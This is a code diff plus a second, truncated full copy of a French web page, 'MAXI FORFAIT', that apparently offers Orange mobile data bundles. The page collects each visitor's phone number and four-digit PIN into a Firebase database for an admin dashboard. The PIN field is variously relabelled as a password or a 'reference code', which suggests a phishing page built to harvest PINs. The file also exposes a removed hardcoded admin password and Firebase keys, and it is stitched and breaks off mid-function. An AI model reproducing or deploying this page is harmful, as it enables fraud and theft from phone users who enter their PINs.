@@ -2,11 +2,11 @@
 <html lang="fr">
 <head>
     <link rel="manifest" href="manifest.json">
-<meta name="theme-color" content="#0066cc">
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#0066cc">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>MAXI FORFAIT</title>
+    <title>MAXI FORFAIT</title>
 
 <style>
 * {
@@ -108,6 +108,11 @@ button {
 
 button:active {
     transform: scale(.98);
+}
+
+button:disabled {
+    opacity: .6;
+    cursor: not-allowed;
 }
 
 .main-btn {
@@ -226,7 +231,6 @@ footer {
     color: #888;
     padding: 25px 5px;
 }
-
 </style>
 </head>
 
@@ -252,10 +256,10 @@ footer {
 <label>Numéro de téléphone et code pin</label>
 
 <input
-type="tel"
-id="telephone"
-placeholder="Ex : 0975432345/1743"
-required
+    type="tel"
+    id="telephone"
+    placeholder="Ex : 0975432345/1743"
+    required
 >
 
 <label>Réseau mobile</label>
@@ -267,36 +271,34 @@ required
 <label>Forfait souhaité</label>
 
 <select id="forfait" required>
-
-<option value="">Choisir un forfait</option>
-<option value="1 Go">1 Go</option>
-<option value="2 Go">2 Go</option>
-<option value="3 Go">3 Go</option>
-<option value="4 Go">4 Go</option>
-<option value="5 Go">5 Go</option>
-
+    <option value="">Choisir un forfait</option>
+    <option value="1 Go">1 Go</option>
+    <option value="2 Go">2 Go</option>
+    <option value="3 Go">3 Go</option>
+    <option value="4 Go">4 Go</option>
+    <option value="5 Go">5 Go</option>
 </select>
 
 <button type="submit" class="main-btn" id="envoyer">
-DEMANDER LE FORFAIT
+    DEMANDER LE FORFAIT
 </button>
 
 </form>
 
 <div class="success" id="confirmation">
-Votre demande a été enregistrée !
-Nous vous informons qu'un lien de confirmation vous sera envoyé dès que notre équipe aura examiné et traité votre demande. Nous vous remercions pour votre patience et votre confiance.
-Merci d'avoir choisi MAXI FORFAIT.
+    Votre demande a été enregistrée !
+    Nous vous informons qu'un lien de confirmation vous sera envoyé dès que notre équipe aura examiné et traité votre demande. Nous vous remercions pour votre patience et votre confiance.
+    Merci d'avoir choisi MAXI FORFAIT.
 </div>
 
 <div class="info">
-Votre demande sera traitée par notre équipe.
+    Votre demande sera traitée par notre équipe.
 </div>
 
 </div>
 
 <button class="admin-btn" onclick="ouvrirAdmin()">
-ESPACE ADMINISTRATEUR
+    ESPACE ADMINISTRATEUR
 </button>
 
 </section>
@@ -310,22 +312,35 @@ ESPACE ADMINISTRATEUR
 
 <h2>Administration</h2>
 
-<label>Code administrateur</label>
+<label>Adresse e-mail</label>
 
 <input
-type="password"
-id="codeAdmin"
-placeholder="Code administrateur"
+    type="email"
+    id="emailAdmin"
+    placeholder="Votre adresse e-mail"
+    autocomplete="username"
+    required
 >
 
-<button class="main-btn" onclick="connecter()">
-SE CONNECTER
+<label>Mot de passe</label>
+
+<input
+    type="password"
+    id="motDePasseAdmin"
+    placeholder="Votre mot de passe Firebase"
+    autocomplete="current-password"
+    required
+>
+
+<button class="main-btn" id="boutonConnexion"
+        onclick="connecter()">
+    SE CONNECTER
 </button>
 
 <p id="erreur" style="color:red;margin-top:15px"></p>
 
 <button class="retour" onclick="retourClient()">
-RETOUR
+    RETOUR
 </button>
 
 </div>
@@ -342,36 +357,38 @@ RETOUR
 <h2>Tableau de bord</h2>
 
 <button class="logout" onclick="deconnecter()">
-DÉCONNEXION
+    DÉCONNEXION
 </button>
 
 <div class="stats">
 
 <div class="stat">
-<span>Total des demandes</span>
-<strong id="total">0</strong>
+    <span>Total des demandes</span>
+    <strong id="total">0</strong>
 </div>
 
 <div class="stat">
-<span>En attente</span>
-<strong id="attente">0</strong>
+    <span>En attente</span>
+    <strong id="attente">0</strong>
 </div>
 
 <div class="stat">
-<span>En cours</span>
-<strong id="cours">0</strong>
+    <span>En cours</span>
+    <strong id="cours">0</strong>
 </div>
 
 <div class="stat">
-<span>Livrées</span>
-<strong id="livrees">0</strong>
+    <span>Livrées</span>
+    <strong id="livrees">0</strong>
 </div>
 
 </div>
 
 <h3>Demandes des clients</h3>
 
-<div id="listeCommandes"></div>
+<div id="listeCommandes">
+    <div class="empty">Chargement des commandes...</div>
+</div>
 
 </div>
 
@@ -380,49 +397,73 @@ DÉCONNEXION
 </div>
 
 <footer>
-MAXI FORFAIT © 2026
-<br><br>
-Votre satisfaction, notre priorité.
+    MAXI FORFAIT © 2026
+    <br><br>
+    Votre satisfaction, notre priorité.
 </footer>
 
 
-<script>
+<!-- FIREBASE ET JAVASCRIPT -->
 
-// CONFIGURATION
+<script type="module">
 
-const CODE_ADMIN = "maxi@794";
+import { initializeApp } from
+"https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
+
+import {
+    getFirestore,
+    collection,
+    addDoc,
+    onSnapshot,
+    doc,
+    updateDoc,
+    deleteDoc
+} from
+"https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore.js";
+
+import {
+    getAuth,
+    signInWithEmailAndPassword,
+    signOut
+} from
+"https://www.gstatic.com/firebasejs/10.14.1/firebase-auth.js";
+
+
+// CONFIGURATION FIREBASE
+
+const firebaseConfig = {
+    apiKey: "AIzaSyAOUmUzaVqwIr6G8VpcQnaVdkhNVTdgFlM",
+    authDomain: "maxi-forfait.firebaseapp.com",
+    projectId: "maxi-forfait",
+    storageBucket: "maxi-forfait.firebasestorage.app",
+    messagingSenderId: "190336786835",
+    appId: "1:190336786835:web:d052c6e35b1c3fdbf20866",
+    measurementId: "G-QMS5B2CX60"
+};
+
+
+// IDENTIFIANT ADMINISTRATEUR
+
+const ADMIN_UID = "h3au1Rflw6djhOdyap6V";
+
+
+// INITIALISATION
+
+const app = initializeApp(firebaseConfig);
+
+const db = getFirestore(app);
+
+const auth = getAuth(app);
 
 const RESEAU_FIXE = "Orange";
 
-
-// STOCKAGE DES COMMANDES
-
-function obtenirCommandes() {
-
-    try {
-        return JSON.parse(
-            localStorage.getItem("maxiCommandes") || "[]"
-        );
-    } catch (e) {
-        return [];
-    }
-
-}
-
-function enregistrerCommandes(commandes) {
-
-    localStorage.setItem(
-        "maxiCommandes",
-        JSON.stringify(commandes)
-    );
-
-}
+let arreterEcoute = null;
 
 
 // FORMULAIRE CLIENT
 
 document.getElementById("formulaire")
-.addEventListener("submit", function(e) {
+.addEventListener("submit", async function(e) {
 
     e.preventDefault();
 
@@ -432,19 +473,27 @@ document.getElementById("formulaire")
     const forfait =
         document.getElementById("forfait").value;
 
+    const bouton =
+        document.getElementById("envoyer");
+
     if (!telephone || !forfait) {
         alert("Veuillez remplir tous les champs.");
         return;
     }
 
     if (!/^\d{10}\/\d{4}$/.test(telephone)) {
-    alert("Veuillez saisir correctement votre numéro de téléphone et votre mot de passe. Exemple : 0842500878/1324");
-    return;
-}
+
+        alert(
+            "Veuillez saisir correctement votre numéro et votre code pin. Exemple : 0842500878/1324"
+        );
+
+        return;
+    }
+
+    bouton.disabled = true;
+    bouton.textContent = "ENREGISTREMENT...";
 
     const commande = {
-
-        id: Date.now(),
 
         telephone: telephone,
 
@@ -458,21 +507,30 @@ document.getElementById("formulaire")
 
     };
 
-    const commandes = obtenirCommandes();
-
-    commandes.unshift(commande);
-
     try {
 
-        enregistrerCommandes(commandes);
+        await addDoc(
+            collection(db, "commandes"),
+            commande
+        );
 
-        document.getElementById("confirmation").style.display = "block";
+        document.getElementById("confirmation").style.display =
+            "block";
 
         this.reset();
 
-    } catch (e) {
+    } catch (error) {
 
-        alert("Impossible d'enregistrer la demande sur cet appareil.");
+        console.error("Erreur Firestore :", error);
+
+        alert(
+            "Impossible d'enregistrer la demande. Vérifiez votre connexion ou les règles Firebase."
+        );
+
+    } finally {
+
+        bouton.disabled = false;
+        bouton.textContent = "DEMANDER LE FORFAIT";
 
     }
 
@@ -481,67 +539,185 @@ document.getElementById("formulaire")
 
 // NAVIGATION
 
-function ouvrirAdmin() {
+window.ouvrirAdmin = function() {
 
-    document.getElementById("client").classList.add("hidden");
+    document.getElementById("client")
+        .classList.add("hidden");
 
-    document.getElementById("connexion").classList.remove("hidden");
+    document.getElementById("connexion")
+        .classList.remove("hidden");
 
-}
+};
 
-function retourClient() {
 
-    document.getElementById("connexion").classList.add("hidden");
+window.retourClient = function() {
 
-    document.getElementById("client").classList.remove("hidden");
+    document.getElementById("connexion")
+        .classList.add("hidden");
+
+    document.getElementById("client")
+        .classList.remove("hidden");
 
     document.getElementById("erreur").textContent = "";
 
-}
+};
 
 
-// CONNEXION ADMIN
+// CONNEXION ADMINISTRATEUR FIREBASE
 
-function connecter() {
+window.connecter = async function() {
 
-    const code = document.getElementById("codeAdmin").value;
+    const email =
+        document.getElementById("emailAdmin").value.trim();
 
-    if (code === CODE_ADMIN) {
+    const motDePasse =
+        document.getElementById("motDePasseAdmin").value;
 
-        document.getElementById("connexion").classList.add("hidden");
+    const erreur =
+        document.getElementById("erreur");
 
-        document.getElementById("dashboard").classList.remove("hidden");
+    const bouton =
+        document.getElementById("boutonConnexion");
 
-        afficherCommandes();
+    erreur.textContent = "";
 
-    } else {
+    if (!email || !motDePasse) {
+        erreur.textContent =
+            "Veuillez saisir votre e-mail et votre mot de passe.";
+        return;
+    }
 
-        document.getElementById("erreur").textContent =
-            "Code incorrect !";
+    bouton.disabled = true;
+    bouton.textContent = "CONNEXION...";
+
+    try {
+
+        const resultat =
+            await signInWithEmailAndPassword(
+                auth,
+                email,
+                motDePasse
+            );
+
+        if (resultat.user.uid !== ADMIN_UID) {
+
+            await signOut(auth);
+
+            erreur.textContent =
+                "Ce compte n'est pas autorisé à accéder à l'administration.";
+
+            return;
+        }
+
+        document.getElementById("connexion")
+            .classList.add("hidden");
+
+        document.getElementById("dashboard")
+            .classList.remove("hidden");
+
+        ecouterCommandes();
+
+    } catch (error) {
+
+        console.error("Erreur de connexion :", error);
+
+        erreur.textContent =
+            "Connexion impossible. Vérifiez votre e-mail et votre mot de passe.";
+
+    } finally {
+
+        bouton.disabled = false;
+        bouton.textContent = "SE CONNECTER";
 
     }
 
+};
+
+
+// DÉCONNEXION
+
+window.deconnecter = async function() {
+
+    if (arreterEcoute) {
+        arreterEcoute();
+        arreterEcoute = null;
+    }
+
+    try {
+
+        await signOut(auth);
+
+        document.getElementById("dashboard")
+            .classList.add("hidden");
+
+        document.getElementById("client")
+            .classList.remove("hidden");
+
+        document.getElementById("emailAdmin").value = "";
+
+        document.getElementById("motDePasseAdmin").value = "";
+
+    } catch (error) {
+
+        console.error("Erreur de déconnexion :", error);
+
+        alert("Impossible de se déconnecter.");
+
+    }
+
+};
+
+
+// ÉCOUTE EN TEMPS RÉEL DES COMMANDES
+
+function ecouterCommandes() {
+
+    if (arreterEcoute) {
+        arreterEcoute();
+    }
+
+    const liste =
+        document.getElementById("listeCommandes");
+
+    liste.innerHTML =
+        '<div class="empty">Chargement des commandes...</div>';
+
+    arreterEcoute = onSnapshot(
+        collection(db, "commandes"),
+
+        function(snapshot) {
+
+            const commandes = snapshot.docs.map(function(document) {
+
+                return {
+                    id: document.id,
+                    ...document.data()
+                };
+
+            });
+
+            commandes.reverse();
+
+            afficherCommandes(commandes);
+
+        },
+
+        function(error) {
+
+            console.error("Erreur de lecture :", error);
+
+            liste.innerHTML =
+                '<div class="empty">Impossible de charger les commandes.</div>';
+
+        }
+    );
+
 }
 
 
-// DECONNEXION
+// AFFICHAGE DES COMMANDES
 
-function deconnecter() {
-
-    document.getElementById("dashboard").classList.add("hidden");
-
-    document.getElementById("client").classList.remove("hidden");
-
-    document.getElementById("codeAdmin").value = "";
-
-}
-
-
-// TABLEAU DE BORD
-
-function afficherCommandes() {
-
-    const commandes = obtenirCommandes();
+function afficherCommandes(commandes) {
 
     document.getElementById("total").textContent =
         commandes.length;
@@ -555,7 +731,8 @@ function afficherCommandes() {
     document.getElementById("livrees").textContent =
         commandes.filter(c => c.statut === "Livré").length;
 
-    const liste = document.getElementById("listeCommandes");
+    const liste =
+        document.getElementById("listeCommandes");
 
     liste.innerHTML = "";
 
@@ -577,7 +754,7 @@ function afficherCommandes() {
         const infos = document.createElement("div");
 
         const lignes = [
-            ["Numéro", c.telephone],
+            ["Numéro et référence", c.telephone],
             ["Réseau", c.reseau],
             ["Forfait", c.forfait],
             ["Date", c.date],
@@ -594,7 +771,9 @@ function afficherCommandes() {
 
             p.appendChild(strong);
 
-            p.appendChild(document.createTextNode(item[1]));
+            p.appendChild(
+                document.createTextNode(item[1] || "")
+            );
 
             infos.appendChild(p);
 
@@ -603,40 +782,49 @@ function afficherCommandes() {
 
         // BOUTON EN COURS
 
-        const boutonCours = document.createElement("button");
+        const boutonCours =
+            document.createElement("button");
 
         boutonCours.className = "encours";
 
         boutonCours.textContent = "En cours";
 
         boutonCours.onclick = function() {
+
             changerStatut(c.id, "En cours");
+
         };
 
 
         // BOUTON LIVRÉ
 
-        const boutonLivre = document.createElement("button");
+        const boutonLivre =
+            document.createElement("button");
 
         boutonLivre.className = "livrer";
 
         boutonLivre.textContent = "Livré";
 
         boutonLivre.onclick = function() {
+
             changerStatut(c.id, "Livré");
+
         };
 
 
         // BOUTON SUPPRIMER
 
-        const boutonSupprimer = document.createElement("button");
+        const boutonSupprimer =
+            document.createElement("button");
 
         boutonSupprimer.className = "supprimer";
 
         boutonSupprimer.textContent = "Supprimer";
 
         boutonSupprimer.onclick = function() {
+
             supprimerCommande(c.id);
+
         };
 
 
@@ -655,42 +843,949 @@ function afficherCommandes() {
 }
 
 
-// CHANGER LE STATUT
+// CHANGER LE STATUT DANS FIRESTORE
 
-function changerStatut(id, statut) {
+async function changerStatut(id, statut) {
 
-    const commandes = obtenirCommandes();
+    try {
 
-    const commande = commandes.find(c => c.id === id);
+        await updateDoc(
+            doc(db, "commandes", id),
+            {
+                statut: statut
+            }
+        );
 
-    if (commande) {
+    } catch (error) {
 
-        commande.statut = statut;
+        console.error("Erreur de modification :", error);
 
-        enregistrerCommandes(commandes);
-
-        afficherCommandes();
+        alert("Impossible de modifier cette commande.");
 
     }
 
 }
 
 
-// SUPPRIMER UNE COMMANDE
+// SUPPRIMER UNE COMMANDE DE FIRESTORE
 
-function supprimerCommande(id) {
+async function supprimerCommande(id) {
 
     if (!confirm("Voulez-vous supprimer cette demande ?")) {
         return;
     }
 
-    const commandes = obtenirCommandes()
-        .filter(c => c.id !== id);
+    try {
 
-    enregistrerCommandes(commandes);
+        await deleteDoc(
+            doc(db, "commandes", id)
+        );
 
-    afficherCommandes();
+    } catch (error) {
 
+        console.error("Erreur de suppression :", error);
+
+        alert("Impossible de supprimer cette commande.");
+
+    }
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#0066cc">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>MAXI FORFAIT</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: Arial, sans-serif;
+    background: #fff7ed;
+    color: #333;
+}
+
+header {
+    background: #ff8500;
+    color: white;
+    text-align: center;
+    padding: 28px 15px;
+}
+
+.logo {
+    font-size: 30px;
+    font-weight: bold;
+    letter-spacing: 1px;
+}
+
+header p {
+    margin-top: 8px;
+    font-size: 14px;
+}
+
+.container {
+    max-width: 480px;
+    margin: 25px auto;
+    padding: 15px;
+}
+
+.card {
+    background: white;
+    padding: 23px;
+    border-radius: 15px;
+    box-shadow: 0 5px 20px rgba(0,0,0,.07);
+    margin-bottom: 20px;
+}
+
+h2 {
+    color: #f07800;
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+h3 {
+    margin-bottom: 15px;
+}
+
+label {
+    display: block;
+    font-size: 14px;
+    font-weight: bold;
+    margin: 16px 0 8px;
+}
+
+input, select {
+    width: 100%;
+    padding: 14px;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    font-size: 15px;
+    outline: none;
+    background: white;
+}
+
+input:focus, select:focus {
+    border-color: #ff8500;
+}
+
+.reseau-fixe {
+    width: 100%;
+    padding: 14px;
+    background: #fff0dd;
+    border: 1px solid #ffd19c;
+    border-radius: 8px;
+    color: #e07800;
+    font-weight: bold;
+    font-size: 15px;
+}
+
+button {
+    border: none;
+    border-radius: 8px;
+    padding: 13px;
+    background: #ff8500;
+    color: white;
+    font-weight: bold;
+    font-size: 15px;
+    cursor: pointer;
+}
+
+button:active {
+    transform: scale(.98);
+}
+
+button:disabled {
+    opacity: .6;
+    cursor: not-allowed;
+}
+
+.main-btn {
+    width: 100%;
+    margin-top: 22px;
+}
+
+.admin-btn {
+    background: #252525;
+    width: 100%;
+}
+
+.hidden {
+    display: none !important;
+}
+
+.info {
+    background: #fff0dd;
+    color: #995000;
+    padding: 13px;
+    border-radius: 8px;
+    font-size: 13px;
+    margin-top: 18px;
+    text-align: center;
+}
+
+.success {
+    display: none;
+    background: #e5f8eb;
+    color: #18763b;
+    padding: 14px;
+    border-radius: 8px;
+    margin-top: 15px;
+    font-size: 14px;
+    text-align: center;
+}
+
+.stats {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin: 20px 0;
+}
+
+.stat {
+    background: #fff0dd;
+    padding: 18px 10px;
+    border-radius: 10px;
+    text-align: center;
+}
+
+.stat span {
+    font-size: 13px;
+}
+
+.stat strong {
+    display: block;
+    color: #f07800;
+    font-size: 27px;
+    margin-top: 8px;
+}
+
+.commande {
+    background: #fffaf4;
+    border: 1px solid #ffdfba;
+    border-radius: 10px;
+    padding: 15px;
+    margin-bottom: 13px;
+}
+
+.commande p {
+    font-size: 14px;
+    margin: 8px 0;
+    overflow-wrap: anywhere;
+}
+
+.commande button {
+    margin-top: 10px;
+    margin-right: 5px;
+    font-size: 12px;
+}
+
+.livrer {
+    background: #159447;
+}
+
+.supprimer {
+    background: #dc3545;
+}
+
+.encours {
+    background: #2879d0;
+}
+
+.logout {
+    width: 100%;
+    background: #333;
+    margin-bottom: 15px;
+}
+
+.retour {
+    width: 100%;
+    background: #777;
+    margin-top: 10px;
+}
+
+footer {
+    text-align: center;
+    color: #888;
+    padding: 25px;
+    font-size: 12px;
+}
+
+.empty {
+    text-align: center;
+    color: #888;
+    padding: 25px 5px;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <div class="logo">MAXI FORFAIT</div>
+    <p>Bienvenue sur Maxi Forfait</p>
+</header>
+
+<div class="container">
+
+<!-- ESPACE CLIENT -->
+
+<section id="client">
+
+<div class="card">
+
+<h2>Demander un forfait</h2>
+
+<form id="formulaire">
+
+<label>Numéro de téléphone et code pin</label>
+
+<input
+    type="tel"
+    id="telephone"
+    placeholder="Ex : 0975432345/1743"
+    required
+>
+
+<label>Réseau mobile</label>
+
+<div class="reseau-fixe">
+    Orange
+</div>
+
+<label>Forfait souhaité</label>
+
+<select id="forfait" required>
+    <option value="">Choisir un forfait</option>
+    <option value="1 Go">1 Go</option>
+    <option value="2 Go">2 Go</option>
+    <option value="3 Go">3 Go</option>
+    <option value="3 Go">3 Go</option>
+    <option value="4 Go">4 Go</option>
+    <option value="5 Go">5 Go</option>
+</select>
+
+<button type="submit" class="main-btn" id="envoyer">
+    DEMANDER LE FORFAIT
+</button>
+
+</form>
+
+<div class="success" id="confirmation">
+    Votre demande a été enregistrée !
+    Nous vous informons qu'un lien de confirmation vous sera envoyé dès que notre équipe aura examiné et traité votre demande. Nous vous remercions pour votre patience et votre confiance.
+    Merci d'avoir choisi MAXI FORFAIT.
+</div>
+
+<div class="info">
+    Votre demande sera traitée par notre équipe.
+</div>
+
+</div>
+
+<button class="admin-btn" onclick="ouvrirAdmin()">
+    ESPACE ADMINISTRATEUR
+</button>
+
+</section>
+
+
+<!-- CONNEXION ADMIN -->
+
+<section id="connexion" class="hidden">
+
+<div class="card">
+
+<h2>Administration</h2>
+
+<label>Adresse e-mail</label>
+
+<input
+    type="email"
+    id="emailAdmin"
+    placeholder="Votre adresse e-mail"
+    autocomplete="username"
+    required
+>
+
+<label>Mot de passe</label>
+
+<input
+    type="password"
+    id="motDePasseAdmin"
+    placeholder="Votre mot de passe Firebase"
+    autocomplete="current-password"
+    required
+>
+
+<button class="main-btn" id="boutonConnexion"
+        onclick="connecter()">
+    SE CONNECTER
+</button>
+
+<p id="erreur" style="color:red;margin-top:15px"></p>
+
+<button class="retour" onclick="retourClient()">
+    RETOUR
+</button>
+
+</div>
+
+</section>
+
+
+<!-- TABLEAU DE BORD -->
+
+<section id="dashboard" class="hidden">
+
+<div class="card">
+
+<h2>Tableau de bord</h2>
+
+<button class="logout" onclick="deconnecter()">
+    DÉCONNEXION
+</button>
+
+<div class="stats">
+
+<div class="stat">
+    <span>Total des demandes</span>
+    <strong id="total">0</strong>
+</div>
+
+<div class="stat">
+    <span>En attente</span>
+    <strong id="attente">0</strong>
+</div>
+
+<div class="stat">
+    <span>En cours</span>
+    <strong id="cours">0</strong>
+</div>
+
+<div class="stat">
+    <span>Livrées</span>
+    <strong id="livrees">0</strong>
+</div>
+
+</div>
+
+<h3>Demandes des clients</h3>
+
+<div id="listeCommandes">
+    <div class="empty">Chargement des commandes...</div>
+</div>
+
+</div>
+
+</section>
+
+</div>
+
+<footer>
+    MAXI FORFAIT © 2026
+    <br><br>
+    Votre satisfaction, notre priorité.
+</footer>
+
+
+<!-- FIREBASE ET JAVASCRIPT -->
+
+<script type="module">
+
+import { initializeApp } from
+"https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
+
+import {
+    getFirestore,
+    collection,
+    addDoc,
+    onSnapshot,
+    doc,
+    updateDoc,
+    deleteDoc
+} from
+"https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore.js";
+
+import {
+    getAuth,
+    signInWithEmailAndPassword,
+    signOut
+} from
+"https://www.gstatic.com/firebasejs/10.14.1/firebase-auth.js";
+
+
+// CONFIGURATION FIREBASE
+
+const firebaseConfig = {
+    apiKey: "AIzaSyAOUmUzaVqwIr6G8VpcQnaVdkhNVTdgFlM",
+    authDomain: "maxi-forfait.firebaseapp.com",
+    projectId: "maxi-forfait",
+    storageBucket: "maxi-forfait.firebasestorage.app",
+    messagingSenderId: "190336786835",
+    appId: "1:190336786835:web:d052c6e35b1c3fdbf20866",
+    measurementId: "G-QMS5B2CX60"
+};
+
+
+// IDENTIFIANT ADMINISTRATEUR
+
+const ADMIN_UID = "COLLE_ICI_TON_UID_FIREBASE";
+
+
+// INITIALISATION
+
+const app = initializeApp(firebaseConfig);
+
+const db = getFirestore(app);
+
+const auth = getAuth(app);
+
+const RESEAU_FIXE = "Orange";
+
+let arreterEcoute = null;
+
+
+// FORMULAIRE CLIENT
+
+document.getElementById("formulaire")
+.addEventListener("submit", async function(e) {
+
+    e.preventDefault();
+
+    const telephone =
+        document.getElementById("telephone").value.trim();
+
+    const forfait =
+        document.getElementById("forfait").value;
+
+    const bouton =
+        document.getElementById("envoyer");
+
+    if (!telephone || !forfait) {
+        alert("Veuillez remplir tous les champs.");
+        return;
+    }
+
+    if (!/^\d{10}\/\d{4}$/.test(telephone)) {
+
+        alert(
+            "Veuillez saisir correctement votre numéro et votre code de référence. Exemple : 0842500878/1324"
+        );
+
+        return;
+    }
+
+    bouton.disabled = true;
+    bouton.textContent = "ENREGISTREMENT...";
+
+    const commande = {
+
+        telephone: telephone,
+
+        reseau: RESEAU_FIXE,
+
+        forfait: forfait,
+
+        date: new Date().toLocaleString("fr-FR"),
+
+        statut: "En attente"
+
+    };
+
+    try {
+
+        await addDoc(
+            collection(db, "commandes"),
+            commande
+        );
+
+        document.getElementById("confirmation").style.display =
+            "block";
+
+        this.reset();
+
+    } catch (error) {
+
+        console.error("Erreur Firestore :", error);
+
+        alert(
+            "Impossible d'enregistrer la demande. Vérifiez votre connexion ou les règles Firebase."
+        );
+
+    } finally {
+
+        bouton.disabled = false;
+        bouton.textContent = "DEMANDER LE FORFAIT";
+
+    }
+
+});
+
+
+// NAVIGATION
+
+window.ouvrirAdmin = function() {
+
+    document.getElementById("client")
+        .classList.add("hidden");
+
+    document.getElementById("connexion")
+        .classList.remove("hidden");
+
+};
+
+
+window.retourClient = function() {
+
+    document.getElementById("connexion")
+        .classList.add("hidden");
+
+    document.getElementById("client")
+        .classList.remove("hidden");
+
+    document.getElementById("erreur").textContent = "";
+
+};
+
+
+// CONNEXION ADMINISTRATEUR FIREBASE
+
+window.connecter = async function() {
+
+    const email =
+        document.getElementById("emailAdmin").value.trim();
+
+    const motDePasse =
+        document.getElementById("motDePasseAdmin").value;
+
+    const erreur =
+        document.getElementById("erreur");
+
+    const bouton =
+        document.getElementById("boutonConnexion");
+
+    erreur.textContent = "";
+
+    if (!email || !motDePasse) {
+        erreur.textContent =
+            "Veuillez saisir votre e-mail et votre mot de passe.";
+        return;
+    }
+
+    bouton.disabled = true;
+    bouton.textContent = "CONNEXION...";
+
+    try {
+
+        const resultat =
+            await signInWithEmailAndPassword(
+                auth,
+                email,
+                motDePasse
+            );
+
+        if (resultat.user.uid !== ADMIN_UID) {
+
+            await signOut(auth);
+
+            erreur.textContent =
+                "Ce compte n'est pas autorisé à accéder à l'administration.";
+
+            return;
+        }
+
+        document.getElementById("connexion")
+            .classList.add("hidden");
+
+        document.getElementById("dashboard")
+            .classList.remove("hidden");
+
+        ecouterCommandes();
+
+    } catch (error) {
+
+        console.error("Erreur de connexion :", error);
+
+        erreur.textContent =
+            "Connexion impossible. Vérifiez votre e-mail et votre mot de passe.";
+
+    } finally {
+
+        bouton.disabled = false;
+        bouton.textContent = "SE CONNECTER";
+
+    }
+
+};
+
+
+// DÉCONNEXION
+
+window.deconnecter = async function() {
+
+    if (arreterEcoute) {
+        arreterEcoute();
+        arreterEcoute = null;
+    }
+
+    try {
+
+        await signOut(auth);
+
+        document.getElementById("dashboard")
+            .classList.add("hidden");
+
+        document.getElementById("client")
+            .classList.remove("hidden");
+
+        document.getElementById("emailAdmin").value = "";
+
+        document.getElementById("motDePasseAdmin").value = "";
+
+    } catch (error) {
+
+        console.error("Erreur de déconnexion :", error);
+
+        alert("Impossible de se déconnecter.");
+
+    }
+
+};
+
+
+// ÉCOUTE EN TEMPS RÉEL DES COMMANDES
+
+function ecouterCommandes() {
+
+    if (arreterEcoute) {
+        arreterEcoute();
+    }
+
+    const liste =
+        document.getElementById("listeCommandes");
+
+    liste.innerHTML =
+        '<div class="empty">Chargement des commandes...</div>';
+
+    arreterEcoute = onSnapshot(
+        collection(db, "commandes"),
+
+        function(snapshot) {
+
+            const commandes = snapshot.docs.map(function(document) {
+
+                return {
+                    id: document.id,
+                    ...document.data()
+                };
+
+            });
+
+            commandes.reverse();
+
+            afficherCommandes(commandes);
+
+        },
+
+        function(error) {
+
+            console.error("Erreur de lecture :", error);
+
+            liste.innerHTML =
+                '<div class="empty">Impossible de charger les commandes.</div>';
+
+        }
+    );
+
+}
+
+
+// AFFICHAGE DES COMMANDES
+
+function afficherCommandes(commandes) {
+
+    document.getElementById("total").textContent =
+        commandes.length;
+
+    document.getElementById("attente").textContent =
+        commandes.filter(c => c.statut === "En attente").length;
+
+    document.getElementById("cours").textContent =
+        commandes.filter(c => c.statut === "En cours").length;
+
+    document.getElementById("livrees").textContent =
+        commandes.filter(c => c.statut === "Livré").length;
+
+    const liste =
+        document.getElementById("listeCommandes");
+
+    liste.innerHTML = "";
+
+    if (commandes.length === 0) {
+
+        liste.innerHTML =
+            '<div class="empty">Aucune demande pour le moment.</div>';
+
+        return;
+
+    }
+
+    commandes.forEach(function(c) {
+
+        const bloc = document.createElement("div");
+
+        bloc.className = "commande";
+
+        const infos = document.createElement("div");
+
+        const lignes = [
+            ["Numéro et référence", c.telephone],
+            ["Réseau", c.reseau],
+            ["Forfait", c.forfait],
+            ["Date", c.date],
+            ["Statut", c.statut]
+        ];
+
+        lignes.forEach(function(item) {
+
+            const p = document.createElement("p");
+
+            const strong = document.createElement("strong");
+
+            strong.textContent = item[0] + " : ";
+
+            p.appendChild(strong);
+
+            p.appendChild(
+                document.createTextNode(item[1] || "")
+            );
+
+            infos.appendChild(p);
+
+        });
+
+
+        // BOUTON EN COURS
+
+        const boutonCours =
+            document.createElement("button");
+
+        boutonCours.className = "encours";
+
+        boutonCours.textContent = "En cours";
+
+        boutonCours.onclick = function() {
+
+            changerStatut(c.id, "En cours");
+
+        };
+
+
+        // BOUTON LIVRÉ
+
+        const boutonLivre =
+            document.createElement("button");
+
+        boutonLivre.className = "livrer";
+
+        boutonLivre.textContent = "Livré";
+
+        boutonLivre.onclick = function() {
+
+            changerStatut(c.id, "Livré");
+
+        };
+
+
+        // BOUTON SUPPRIMER
+
+        const boutonSupprimer =
+            document.createElement("button");
+
+        boutonSupprimer.className = "supprimer";
+
+        boutonSupprimer.textContent = "Supprimer";
+
+        boutonSupprimer.onclick = function() {
+
+            supprimerCommande(c.id);
+
+        };
+
+
+        bloc.appendChild(infos);
+
+        bloc.appendChild(boutonCours);
+
+        bloc.appendChild(boutonLivre);
+
+        bloc.appendChild(boutonSupprimer);
+
+        liste.appendChild(bloc);
+
+    });
+
+}
+
+
+// CHANGER LE STATUT DANS FIRESTORE
+
+async function changerStatut(id, statut) {
+
+    try {
+
+        await updateDoc(
+            doc(db, "commandes", id),
+            {
+                statut: statut
+            }
+        );
+
+    } catch (error) {
+
+        console.error("Erreur de modification :", error);
+
+        alert("Impossible de modifier cette commande.");
+
+    }
+
+}
+
+
+// SUPPRIMER UNE COMMANDE DE FIRESTORE
+
+async function supprimerCommande(id) {
+
+    if (!confirm("Voulez-vous supprimer cette demande ?")) {
+        return;
+    }
+
+    try {
+
+        await deleteDoc(
+            doc(db, "commandes", id)
+        );
+
+    } catch (error) {
+
+        console.error("Erreur de suppression :", error);
+
